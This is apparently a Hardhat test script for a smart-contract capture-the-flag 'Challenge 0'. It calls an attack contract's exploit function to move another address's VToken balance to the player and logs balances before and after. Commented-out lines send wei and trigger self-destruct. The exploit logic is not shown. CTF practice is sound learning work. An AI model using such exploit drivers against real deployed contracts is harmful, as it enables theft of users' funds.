const { expect } = require("chai");

describe("Challenge 0", function () {
  it("Transfer all balance", async function () {
    const [player,deployer] = await ethers.getSigners();
    
    const Contrato = await ethers.getContractFactory("VToken");
    const toa='0x8464135c8F25Da09e49BC8782676a84730C318bC'
    const contrato = await Contrato.attach(toa);
    
    const toa2='0x5FbDB2315678afecb367f032d93F642f64180aa3'
    const Attack = await ethers.getContractFactory("attack");
    const attack = await Attack.attach(toa2);

    const vitalik = '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045';
    
    console.log("Account balance:", (await contrato.balanceOf(vitalik)).toString());
    console.log("Account balance:", (await contrato.balanceOf(player.address)).toString());
    
    const tx=await attack.exploit(toa,vitalik,player.address);
    await ethers.provider.waitForTransaction(tx.hash);
    
    console.log("Account balance:", (await contrato.balanceOf(vitalik)).toString());
    console.log("Account balance:", (await contrato.balanceOf(player.address)).toString());
/*  ENVIAR DINERO a CONTRATO
    const params = { to: toa, 
                    value: ethers.utils.parseUnits("1", "wei").toHexString(),
                    gasLimit: ethers.utils.parseUnits("310000", "wei").toHexString()
                  };
    const txHash = await owner.sendTransaction(params);
    console.log("transactionHash is " + txHash);   */

    //Llamar a autodestruir
    //await contrato.autoDestruir();
  });
});